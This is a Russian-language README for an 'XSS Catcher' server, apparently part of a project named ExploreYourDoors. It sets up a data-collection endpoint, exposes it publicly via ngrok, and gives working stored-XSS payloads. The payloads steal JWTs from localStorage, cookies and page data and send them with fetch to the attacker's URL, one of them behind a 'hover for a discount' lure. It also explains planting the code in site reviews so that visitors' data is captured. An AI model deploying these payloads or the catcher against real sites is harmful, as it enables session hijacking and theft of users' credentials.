# XSS Catcher - сервер для приема XSS-запросов

Этот сервер предназначен для приема и анализа запросов от XSS-атак в проекте ExploreYourDoors.

## Запуск через Docker

1. Сервер запускается автоматически при запуске проекта через docker-compose:
```bash
docker-compose up -d
```

2. XSS-ловушка будет доступна по адресу: http://localhost:3030

## Публикация через ngrok

Для получения публичного URL (чтобы XSS-атаки работали извне):

1. Установите ngrok:
```bash
docker exec -it exploreyourdoors-xss-catcher-1 sh -c "npm install -g ngrok"
```

2. Запустите ngrok внутри контейнера:
```bash
docker exec -it exploreyourdoors-xss-catcher-1 sh -c "ngrok http 3030"
```

3. Скопируйте полученный URL из вывода ngrok (например, https://a1b2c3d4.ngrok.io)

## Примеры XSS-кода для атак

```html
<!-- Кража JWT токена -->
<img src="x" onerror="fetch('https://ВАШ-NGROK-URL/api/catch?token='+localStorage.getItem('jwt'))">

<!-- Кража всех данных -->
<div onmouseover="fetch('https://ВАШ-NGROK-URL/api/catch', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    jwt: localStorage.getItem('jwt'),
    cookies: document.cookie,
    url: location.href,
    userAgent: navigator.userAgent
  })
})">Наведите на меня для получения скидки!</div>
```

## API эндпоинты

- `GET /` - информационная страница
- `GET /api/logs` - получить список всех логов
- `GET /api/logs/:filename` - получить содержимое конкретного лог-файла
- `GET или POST /api/catch` - эндпоинт для приема XSS-запросов

## Как это работает

1. Злоумышленник добавляет XSS-код в отзыв на вашем сайте
2. Когда пользователь просматривает страницу с этим отзывом, JavaScript отправляет данные на ваш XSS Catcher
3. Данные сохраняются в JSON-файл в папке logs/
4. Вы можете просмотреть перехваченные данные через API сервера 